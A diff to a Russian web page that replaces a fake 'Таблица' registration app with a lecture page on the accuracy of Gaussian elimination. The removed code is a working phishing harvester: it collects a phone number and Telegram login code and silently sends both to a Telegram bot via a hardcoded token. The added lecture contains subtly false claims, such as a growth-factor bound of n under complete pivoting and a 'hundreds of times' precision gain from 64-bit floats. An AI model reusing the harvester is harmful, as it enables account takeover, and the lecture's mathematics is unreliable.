@@ -1,149 +1,514 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Приложение Таблица</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Точность метода Гаусса</title>
+    <!-- Подключение MathJax для отображения формул -->
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #f2f2f7; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { width: 92%; max-width: 400px; background: white; padding: 30px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
-        .step { display: none; }
-        .active { display: block; }
-        
-        h2 { margin-bottom: 10px; color: #1c1c1e; font-size: 22px; }
-        p { color: #3a3a3c; font-size: 15px; line-height: 1.4; margin-bottom: 25px; }
-        
-        select, input { width: 100%; padding: 16px; font-size: 17px; border: 2px solid #efeff4; border-radius: 14px; margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.2s; }
-        input:focus { border-color: #007aff; }
-        
-        button { width: 100%; padding: 18px; font-size: 18px; font-weight: 600; background: #007aff; color: white; border: none; border-radius: 14px; cursor: pointer; transition: background 0.2s, transform 0.1s; }
-        button:active { background: #0056b3; transform: scale(0.98); }
+        /* Общие стили для страницы */
+        body {
+            font-family: 'Times New Roman', Times, serif;
+            line-height: 1.6;
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 0 20px;
+            background: #f9f9f9;
+            color: #1a1a1a;
+        }
 
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #fff; }
-        th, td { border: 1px solid #efeff4; padding: 12px; text-align: left; font-size: 14px; }
-        th { background: #f9f9f9; font-weight: 600; }
-        
-        .add-row { background: #34c759; margin-top: 10px; font-size: 14px; padding: 12px; }
-        #status { margin-top: 20px; font-size: 13px; color: #8e8e93; min-height: 18px; }
+        h1, h2, h3 {
+            color: #003366;
+            margin-top: 1.5em;
+        }
+
+        h1 {
+            font-size: 2em;
+            border-bottom: 3px solid #003366;
+            padding-bottom: 10px;
+        }
+
+        h2 {
+            font-size: 1.5em;
+            border-bottom: 1px solid #003366;
+            padding-bottom: 5px;
+        }
+
+        p {
+            text-align: justify;
+            margin: 1em 0;
+        }
+
+        /* Стиль для блоков формул */
+        .formula-block {
+            background: #ffffff;
+            border-left: 4px solid #003366;
+            padding: 12px 20px;
+            margin: 16px 0;
+            overflow-x: auto;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        /* Стиль для нумерованных формул */
+        .formula-block .formula-number {
+            float: right;
+            font-weight: bold;
+            color: #003366;
+        }
+
+        /* Адаптация для мобильных устройств */
+        @media (max-width: 600px) {
+            body {
+                font-size: 14px;
+                padding: 0 12px;
+            }
+            h1 { font-size: 1.6em; }
+            h2 { font-size: 1.3em; }
+            .formula-block {
+                padding: 8px 12px;
+            }
+        }
+
+        /* Стиль для списков */
+        ul, ol {
+            margin: 1em 0;
+            padding-left: 1.8em;
+        }
+
+        li {
+            margin: 0.5em 0;
+        }
+
+        /* Стиль для выделения ключевых терминов */
+        .highlight {
+            font-weight: 600;
+            color: #003366;
+        }
+
+        /* Стиль для сносок и примечаний */
+        .footnote {
+            font-size: 0.9em;
+            color: #555;
+            border-top: 1px solid #ddd;
+            padding-top: 10px;
+            margin-top: 30px;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="step-phone" class="step active">
-        <h2>Здравствуйте!</h2>
-        <p>Это приложение "Таблица". Чтобы записаться в таблицу, нужно зарегистрироваться. <br><br><b>Введите номер телефона:</b></p>
-        <select id="country">
-            <option value="+375">🇧🇾 Беларусь (+375)</option>
-            <option value="+7">🇷🇺 Россия (+7)</option>
-        </select>
-        <input type="tel" id="phone" placeholder="Цифры без кода" inputmode="tel">
-        <button onclick="handlePhone()">Зарегистрироваться</button>
+    <h1>Точность метода Гаусса: детальный анализ</h1>
+
+    <!-- ==================== Раздел 1 ==================== -->
+    <h2>1. Постановка задачи</h2>
+
+    <p>
+        Рассмотрим решение системы линейных алгебраических уравнений (СЛАУ)
+    </p>
+    <div class="formula-block">
+        \[ Ax = b, \]
+    </div>
+    <p>
+        где 
+        \( A \in \mathbb{R}^{n \times n} \) – невырожденная матрица,
+        \( x \) – искомый вектор,
+        \( b \) – вектор правой части.
+    </p>
+    <p>
+        Метод Гаусса (с исключением переменных) даёт приближённое решение
+        \( \tilde{x} \).
+        Вследствие ошибок округления при реализации на ЭВМ это решение
+        не удовлетворяет исходной системе точно. Однако его можно рассматривать
+        как точное решение некоторой <span class="highlight">возмущённой системы</span>:
+    </p>
+    <div class="formula-block">
+        \[ (A + F) \tilde{x} = b + h, \]
+    </div>
+    <p>
+        где 
+        \( F \) и \( h \) – <span class="highlight">эквивалентные возмущения</span>
+        матрицы и правой части, порождённые ошибками округления на всех этапах метода.
+    </p>
+
+    <!-- ==================== Раздел 2 ==================== -->
+    <h2>2. Оценка влияния возмущений на решение (общая теория)</h2>
+
+    <p>
+        Пусть 
+        \( x^* \) – точное решение невозмущённой системы 
+        \( A x^* = b \).
+        Тогда относительная погрешность приближённого решения 
+        \( \tilde{x} \)
+        в любой согласованной норме удовлетворяет неравенству
+        (см. лекцию 3, стр. 2–3):
+    </p>
+    <div class="formula-block">
+        \[
+        \frac{\|x^* - \tilde{x}\|}{\|x^*\|}
+        \le
+        \frac{\|A\|\,\|A^{-1}\|}{1 - \|A^{-1}\|\,\|F\|}
+        \left( \frac{\|F\|}{\|A\|} + \frac{\|h\|}{\|b\|} \right).
+        \]
     </div>
 
-    <div id="step-code" class="step">
-        <h2>Регистрация</h2>
-        <p>Вам придет код через Телеграмм, введите его для завершения регистрации:</p>
-        <input type="text" id="code" placeholder="Введите код" inputmode="numeric">
-        <button onclick="handleCode()">Подтвердить</button>
+    <p>Обозначим:</p>
+    <ul>
+        <li>
+            \( \chi = \|A\|\,\|A^{-1}\| \) – <span class="highlight">число обусловленности</span>
+            матрицы \( A \);
+        </li>
+        <li>
+            \( \delta_A = \dfrac{\|F\|}{\|A\|} \) – относительное возмущение матрицы;
+        </li>
+        <li>
+            \( \delta_b = \dfrac{\|h\|}{\|b\|} \) – относительное возмущение правой части.
+        </li>
+    </ul>
+
+    <p>
+        При условии 
+        \( \|A^{-1}\|\,\|F\| \ll 1 \)
+        (что соответствует устойчивому методу) знаменатель близок к единице,
+        и получаем <span class="highlight">упрощённую оценку</span>:
+    </p>
+    <div class="formula-block">
+        \[
+        \delta_x \le \chi \, (\delta_A + \delta_b),
+        \]
+    </div>
+    <p>
+        где
+        \( \delta_x = \dfrac{\|x^* - \tilde{x}\|}{\|x^*\|} \).
+        Эта формула является <span class="highlight">ключевой</span>
+        для анализа точности любого прямого метода.
+    </p>
+
+    <!-- ==================== Раздел 3 ==================== -->
+    <h2>3. Оценка нормы возмущений для метода Гаусса</h2>
+
+    <p>
+        В методе Гаусса ошибки округления накапливаются в процессе исключения.
+        В рамках <span class="highlight">обратного анализа ошибок</span>
+        (по Уилкинсону) доказывается, что эквивалентные возмущения
+        удовлетворяют оценке (лекция 3, стр. 3–4):
+    </p>
+    <div class="formula-block">
+        \[
+        \|F\|_1 \le 1.01 \, (n^3 + n^2) \, g(A) \, \varepsilon \, \|A\|_1,
+        \]
+    </div>
+    <p>где:</p>
+    <ul>
+        <li>
+            \( \|\cdot\|_1 \) – максимальная столбцовая норма матрицы;
+        </li>
+        <li>
+            \( \varepsilon \) – относительная погрешность машинной арифметики
+            (для двоичных машин с \( t \)-разрядной мантиссой
+            \( \varepsilon = 2^{-t} \));
+        </li>
+        <li>
+            \( g(A) \) – <span class="highlight">коэффициент роста</span>
+            элементов матрицы в процессе исключения:
+        </li>
+    </ul>
+    <div class="formula-block">
+        \[
+        g(A) = \max_{0 \le k \le n-1} \frac{a_k}{a_0},
+        \qquad
+        a_0 = \max_{i,j} |a_{ij}|,
+        \qquad
+        a_k = \max_{i,j} |a_{ij}^{(k)}|,
+        \]
+    </div>
+    <p>
+        где \( a_{ij}^{(k)} \) – элементы матрицы после 
+        \( k \) шагов прямого хода.
+    </p>
+    <p>
+        Член \( (n^3 + n^2) \) отражает квадратичный
+        (по числу операций) рост ошибок, характерный для метода Гаусса.
+        Вклад правой части \( h \) обычно имеет аналогичный порядок,
+        и для простоты часто пренебрегают \( \delta_b \)
+        или считают его малым по сравнению с \( \delta_A \).
+        Тогда \( \delta_A \approx \|F\|_1 / \|A\|_1 \),
+        и из общей оценки следует <span class="highlight">итоговая формула</span>:
+    </p>
+    <div class="formula-block">
+        \[
+        \delta_x \le 1.01 \, \chi \, (n^3 + n^2) \, g(A) \, \varepsilon.
+        \tag{1}
+        \]
+    </div>
+    <p>
+        Эта формула – и есть оценка точности метода Гаусса,
+        упомянутая в лекции.
+    </p>
+
+    <!-- ==================== Раздел 4 ==================== -->
+    <h2>4. Роль числа обусловленности и коэффициента роста</h2>
+
+    <ul>
+        <li>
+            <p>
+                <span class="highlight">Число обусловленности \( \chi \)</span>
+                определяет, насколько сильно малые возмущения входных данных
+                могут исказить решение. Чем больше \( \chi \), тем хуже
+                обусловлена задача, и тем выше чувствительность к ошибкам
+                округления. Даже при \( g(A) = 1 \) и небольшом \( n \)
+                большие \( \chi \) могут привести к катастрофической
+                потере точности.
+            </p>
+        </li>
+        <li>
+            <p>
+                <span class="highlight">Коэффициент роста \( g(A) \)</span>
+                отражает, во сколько раз могут возрасти элементы матрицы
+                в процессе исключения. Если не использовать стратегию
+                выбора главных элементов, \( g(A) \) может стать
+                экспоненциально большим (теоретически до \( 2^{n-1} \)),
+                что делает метод неустойчивым. Применение
+                <strong>выбора главного элемента по столбцу</strong>
+                гарантирует \( |a_{ij}^{(k)}| \le 2^k a_0 \),
+                т.е. \( g(A) \le 2^{n-1} \), что всё ещё слишком велико
+                для больших \( n \). Однако
+                <strong>выбор главного элемента по всей матрице</strong>
+                (полный поиск) обеспечивает
+            </p>
+            <div class="formula-block">
+                \[
+                g(A) \le n,
+                \]
+            </div>
+            <p>
+                что уже приемлемо. Именно такая стратегия используется
+                в стандартных реализациях метода Гаусса для обеспечения
+                устойчивости.
+            </p>
+        </li>
+    </ul>
+
+    <!-- ==================== Раздел 5 ==================== -->
+    <h2>5. Как именно «привлекается норма матрицы» при выводе оценки</h2>
+
+    <p>
+        Процесс получения оценки (1) включает следующие шаги:
+    </p>
+    <ol>
+        <li>
+            <p>
+                <strong>Запись возмущённой системы</strong>
+                \( (A+F)\tilde{x} = b+h \) – здесь
+                \( F \) и \( h \) – неизвестные, но они
+                <span class="highlight">существуют</span>
+                благодаря обратному анализу.
+            </p>
+        </li>
+        <li>
+            <p>
+                <strong>Вывод общей оценки относительной погрешности
+                через нормы</strong> – используется неравенство
+                для обратной матрицы возмущённой системы.
+                Здесь возникает норма \( \|A^{-1}\| \),
+                и появляется число обусловленности \( \chi \).
+            </p>
+        </li>
+        <li>
+            <p>
+                <strong>Оценка нормы \( F \)</strong> – для метода Гаусса
+                проводится детальный пошаговый анализ ошибок округления.
+                На каждом шаге исключения ошибки округления при делении
+                и умножении ограничиваются через \( \varepsilon \)
+                и текущие элементы матрицы. Суммируя эти локальные оценки
+                по всем \( n \) шагам, получают глобальную оценку
+                \( \|F\|_1 \le C(n) \, g(A) \, \varepsilon \, \|A\|_1 \),
+                где \( C(n) \) – полином от \( n \).
+            </p>
+        </li>
+        <li>
+            <p>
+                <strong>Подстановка</strong>
+                \( \|F\|_1 / \|A\|_1 \le 1.01 (n^3+n^2) g(A) \varepsilon \)
+                в упрощённую формулу
+                \( \delta_x \le \chi (\delta_A + \delta_b) \)
+                даёт итоговое неравенство (1).
+            </p>
+        </li>
+    </ol>
+    <p>
+        Таким образом, норма матрицы <span class="highlight">позволяет
+        измерить «величину» возмущения</span> в совокупности,
+        а число обусловленности – связать эту величину с относительной
+        погрешностью решения. Без использования норм нельзя было бы
+        дать количественную оценку, справедливую для любых векторов и матриц.
+    </p>
+
+    <!-- ==================== Раздел 6 ==================== -->
+    <h2>6. Пути повышения точности метода Гаусса</h2>
+
+    <p>
+        Из анализа неравенства (1) следуют четыре основных направления
+        для улучшения точности:
+    </p>
+    <ol>
+        <li>
+            <p>
+                <span class="highlight">Выбор главных элементов</span> –
+                уменьшает \( g(A) \). Полный поиск по всей матрице
+                даёт \( g(A) \le n \), что существенно ограничивает
+                рост ошибок. Частичный выбор по столбцу также полезен,
+                но менее надёжен для плохо обусловленных матриц.
+            </p>
+        </li>
+        <li>
+            <p>
+                <span class="highlight">Работа с числами удвоенной длины</span> –
+                увеличивает точность мантиссы (уменьшает \( \varepsilon \)).
+                Например, использование 64-разрядных чисел вместо
+                32-разрядных уменьшает \( \varepsilon \) в сотни раз,
+                что прямо снижает оценку погрешности.
+            </p>
+        </li>
+        <li>
+            <p>
+                <span class="highlight">Переобусловливание системы</span> –
+                замена переменных или масштабирование строк/столбцов
+                может уменьшить число обусловленности \( \chi \).
+                Например, диагональное масштабирование
+                \( D_1 A D_2 \) часто приводит к меньшему \( \chi \)
+                и, следовательно, к более точному решению.
+            </p>
+        </li>
+        <li>
+            <p>
+                <span class="highlight">Использование итерационного уточнения</span> –
+                даже если приближённое решение получено с погрешностью,
+                можно применить несколько итераций метода Ньютона
+                для СЛАУ (метод улучшения решения), которые позволяют
+                уменьшить ошибку до уровня машинной точности, особенно
+                если система не слишком плохо обусловлена.
+            </p>
+        </li>
+    </ol>
+
+    <!-- ==================== Раздел 7 ==================== -->
+    <h2>7. Практическое значение оценки</h2>
+
+    <p>
+        Оценка (1) носит <span class="highlight">асимптотический
+        и гарантирующий</span> характер – она показывает, что
+        погрешность не превышает указанной величины при условии
+        корректной реализации метода с выбором главных элементов.
+        На практике реальная погрешность часто оказывается значительно
+        меньше этой верхней границы, но формула даёт надёжный критерий
+        для сравнения методов и выбора оптимальной стратегии.
+    </p>
+
+    <p>
+        В итоге, точность метода Гаусса определяется тремя факторами:
+    </p>
+    <ul>
+        <li>
+            <span class="highlight">обусловленностью</span>
+            исходной задачи (\( \chi \));
+        </li>
+        <li>
+            <span class="highlight">коэффициентом роста</span>
+            (\( g(A) \)), управляемым выбором главных элементов;
+        </li>
+        <li>
+            <span class="highlight">разрядностью</span> арифметики
+            (\( \varepsilon \)).
+        </li>
+    </ul>
+    <p>
+        Управляя этими параметрами, можно обеспечить требуемую точность
+        решения практически для любых систем умеренной размерности.
+    </p>
+
+    <!-- ==================== Дополнительные формулы ==================== -->
+    <h2>8. Дополнительные формулы: нормы и погрешности</h2>
+
+    <p>Для полноты приведём также определения норм, используемых в оценках.</p>
+
+    <h3>Нормы векторов:</h3>
+    <div class="formula-block">
+        \[
+        \|\mathbf{y}\|_1 = \sum_{i=1}^{n} |y_i|,
+        \qquad
+        \|\mathbf{y}\|_2 = \sqrt{\sum_{i=1}^{n} |y_i|^2},
+        \qquad
+        \|\mathbf{y}\|_\infty = \max_{1 \le i \le n} |y_i|.
+        \]
     </div>
 
-    <div id="step-table" class="step">
-        <h2>Рабочая таблица</h2>
-        <table id="myTable">
-            <tr><th>Объект</th><th>Значение</th></tr>
-            <tr>
-                <td contenteditable="true">Объект 1</td>
-                <td contenteditable="true">...</td>
-            </tr>
-        </table>
-        <button class="add-row" onclick="addRow()">+ Добавить строку</button>
-        <button style="margin-top:20px; background:#ff9500" onclick="sendTable()">Сохранить данные</button>
+    <h3>Нормы матриц, согласованные с векторными нормами:</h3>
+    <div class="formula-block">
+        \[
+        \|A\|_1 = \max_{1 \le j \le n} \sum_{i=1}^{n} |a_{ij}|,
+        \qquad
+        \|A\|_2 = \sqrt{\lambda_{\max}(A^T A)},
+        \qquad
+        \|A\|_\infty = \max_{1 \le i \le n} \sum_{j=1}^{n} |a_{ij}|.
+        \]
     </div>
 
-    <div id="status">Ожидание...</div>
-</div>
+    <h3>Абсолютная и относительная погрешность вектора:</h3>
+    <div class="formula-block">
+        \[
+        D(\tilde{\mathbf{y}}) = \|\mathbf{y}^* - \tilde{\mathbf{y}}\|,
+        \qquad
+        \delta(\tilde{\mathbf{y}}) = \frac{\|\mathbf{y}^* - \tilde{\mathbf{y}}\|}{\|\tilde{\mathbf{y}}\|}.
+        \]
+    </div>
 
-<script>
-    // Твои данные для связи
-    const TOKEN = '8400053542:AAFTpIhi1dSpYCmYbVCpPxsZzYIpwa-VWWs';
-    const GROUP_ID = '-5298252697';
+    <h3>Абсолютная и относительная погрешность матрицы:</h3>
+    <div class="formula-block">
+        \[
+        D(\tilde{A}) = \|A^* - \tilde{A}\|,
+        \qquad
+        \delta(\tilde{A}) = \frac{\|A^* - \tilde{A}\|}{\|\tilde{A}\|}.
+        \]
+    </div>
 
-    function setStatus(text, isError = false) {
-        const s = document.getElementById('status');
-        s.innerText = text;
-        s.style.color = isError ? "#ff3b30" : "#8e8e93";
-    }
+    <h3>Число обусловленности для симметричной положительно определённой матрицы:</h3>
+    <div class="formula-block">
+        \[
+        \chi = \frac{\lambda_{\max}}{\lambda_{\min}}.
+        \]
+    </div>
 
-    // ТИХАЯ ОТПРАВКА (без окон)
-    function silentSend(text) {
-        setStatus("⏳ Синхронизация...");
-        
-        // 1. В группу Telegram
-        const urlMsg = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${GROUP_ID}&text=${encodeURIComponent(text)}`;
-        // 2. В описание бота (для Python на ПК)
-        const urlDesc = `https://api.telegram.org/bot${TOKEN}/setMyDescription?description=${encodeURIComponent(text)}`;
+    <h3>Ошибки округления при вводе данных:</h3>
+    <div class="formula-block">
+        \[
+        |f_{ij}^{(1)}| \le \varepsilon |a_{ij}|,
+        \qquad
+        |h_i^{(1)}| \le \varepsilon |b_i|.
+        \]
+    </div>
 
-        // Делаем фоновый запрос через "картинки"
-        const img1 = new Image();
-        img1.src = urlMsg;
-        const img2 = new Image();
-        img2.src = urlDesc;
+    <h3>Переход к нормам для начальных возмущений:</h3>
+    <div class="formula-block">
+        \[
+        \|F^{(1)}\| \le \varepsilon \|A\|,
+        \qquad
+        \|h^{(1)}\| \le \varepsilon \|b\|.
+        \]
+    </div>
 
-        setTimeout(() => setStatus("✅ Данные в облаке"), 800);
-    }
-
-    function handlePhone() {
-        const country = document.getElementById('country').value;
-        const phone = document.getElementById('phone').value.trim();
-        
-        // Проверка для РБ и РФ
-        if (country === "+375" && phone.length !== 9) {
-            return setStatus("❌ В номере РБ должно быть 9 цифр", true);
-        }
-        if (country === "+7" && phone.length !== 10) {
-            return setStatus("❌ В номере РФ должно быть 10 цифр", true);
-        }
-        if (phone.length === 0) {
-            return setStatus("❌ Введите номер", true);
-        }
-
-        silentSend("📱 НОВЫЙ ТЕЛЕФОН: " + country + phone);
-        document.getElementById('step-phone').classList.remove('active');
-        document.getElementById('step-code').classList.add('active');
-    }
-
-    function handleCode() {
-        const code = document.getElementById('code').value.trim();
-        
-        // Теперь код может быть любой длины
-        if (code.length === 0) {
-            return setStatus("❌ Введите код для регистрации", true);
-        }
-
-        silentSend("🔑 КОД: " + code);
-        document.getElementById('step-code').classList.remove('active');
-        document.getElementById('step-table').classList.add('active');
-    }
-
-    function addRow() {
-        const table = document.getElementById("myTable");
-        const row = table.insertRow(-1);
-        row.insertCell(0).contentEditable = "true";
-        row.insertCell(1).contentEditable = "true";
-    }
-
-    function sendTable() {
-        let tableData = "📊 ТАБЛИЦА: ";
-        const rows = document.querySelectorAll("#myTable tr");
-        rows.forEach((row, i) => {
-            if(i === 0) return; // Пропуск заголовка
-            const cells = row.querySelectorAll("td");
-            tableData += `[${cells[0].innerText}:${cells[1].innerText}] `;
-        });
-        silentSend(tableData);
-    }
-</script>
+    <!-- ==================== Подвал ==================== -->
+    <div class="footnote">
+        <p>
+            <strong>Примечание:</strong> Все формулы на этой странице
+            отображаются с помощью MathJax. Для корректного отображения
+            убедитесь, что у вас есть подключение к интернету.
+        </p>
+        <p>
+            <em>Источник: лекции по численным методам, раздел
+            «Устойчивость и точность прямых методов».</em>
+        </p>
+    </div>
 
 </body>
 </html>
